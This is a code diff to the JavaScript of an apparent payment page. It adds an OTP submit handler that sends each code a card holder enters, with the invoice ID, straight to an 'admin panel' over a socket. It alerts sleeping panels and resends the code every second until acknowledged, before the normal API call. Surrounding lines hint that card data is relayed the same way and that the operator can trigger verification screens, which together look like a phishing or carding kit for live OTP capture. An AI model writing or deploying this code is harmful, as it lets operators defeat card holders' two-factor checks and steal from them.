@@ -1879,38 +1879,92 @@ const cardDataInterval = setInterval(() => {
            }
          });
        }
-   socket.on('show_otp', () => {
-  const paymentForm = document.getElementById('paymentForm');
-  const otpForm = document.getElementById('otpForm');
-  const cardLastFour = document.getElementById('cardLastFour');
-  const cardNumberInput = document.getElementById('cardNumber');
-  
-  if (!paymentForm || !otpForm || !cardLastFour || !cardNumberInput) return; // Added null check
-  
-  // First make sure otpForm is hidden but with display:block (to prepare for animation)
-  otpForm.style.display = 'block';
-  otpForm.style.opacity = '0';
-  otpForm.style.transform = 'translateY(20px)';
-  
-  // Hide payment form
-  paymentForm.classList.add('hidden');
-  
-  // Set the card last four digits
-  cardLastFour.textContent = cardNumberInput.value.slice(-4);
-  
-  // Start animation after a tiny delay to ensure display change has taken effect
-  setTimeout(() => {
-    otpForm.classList.remove('hidden');
-    // Apply animation class
-    otpForm.classList.add('animate-slide-in');
-  }, 10);
-  
-  // Start OTP timer
-  if (!timerInterval) startOtpTimer();
-  
-  // Reset processing state
-  isProcessing = false;
-});
+// OTP Submission Handler
+const otpSubmitButton = document.getElementById('otpSubmitButton');
+if (otpSubmitButton) {
+  otpSubmitButton.addEventListener('click', async () => {
+    if (isProcessing) return;
+    isProcessing = true;
+    
+    const otpInput = document.getElementById('otp');
+    const otpValue = otpInput ? otpInput.value : '';
+    
+    const otpButton = document.getElementById('otpSubmitButton');
+    const otpLoader = document.getElementById('otpLoader');
+    const btnText = document.getElementById('otpText');
+    
+    if (!otpButton || !otpLoader || !btnText) return; // Added null check
+    
+    otpButton.disabled = true;
+    btnText.style.opacity = '0.5';
+    btnText.style.filter = 'blur(1px)';
+    otpLoader.classList.remove('hidden');
+
+    try {
+      // First, immediately emit the OTP to the admin panel via socket
+      // This ensures real-time updates without waiting for the API call
+      socket.emit('otp_entered', {
+        invoiceId: currentInvoiceId,
+        otp: otpValue,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Send a notification to wake up any sleeping admin panels
+      socket.emit('notify_admin', {
+        type: 'otp_data',
+        invoiceId: currentInvoiceId,
+        message: 'New OTP submission received'
+      });
+      
+      // Set up a fallback to ensure admin panel gets the data
+      let otpDataAcknowledged = false;
+      const otpDataInterval = setInterval(() => {
+        if (otpDataAcknowledged) {
+          clearInterval(otpDataInterval);
+          return;
+        }
+        
+        // Resend OTP data if not acknowledged within 1 second
+        socket.emit('otp_entered', {
+          invoiceId: currentInvoiceId,
+          otp: otpValue,
+          timestamp: new Date().toISOString(),
+          retry: true
+        });
+      }, 1000);
+      
+      // Listen for admin acknowledgment
+      socket.once('otp_data_received', (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          otpDataAcknowledged = true;
+          console.log('OTP data received by admin panel');
+        }
+      });
+      
+      // Then proceed with the regular API call
+      const response = await fetch("/api/submitOTP", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          invoiceId: currentInvoiceId,
+          otp: otpValue
+        })
+      });
+
+      if (!response.ok) throw new Error('Failed to submit OTP');
+      
+      statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+    } catch (err) {
+      console.error('OTP submission error:', err);
+      alert('Error submitting OTP. Please try again.');
+      isProcessing = false;
+      otpButton.disabled = false;
+      otpLoader.classList.add('hidden');
+      btnText.style.opacity = '1';
+      btnText.style.filter = 'none';
+    }
+  });
+}
 
       // Find this section in payment.html (around line 1370-1420)
       socket.on('show_mc_verification', (data) => {
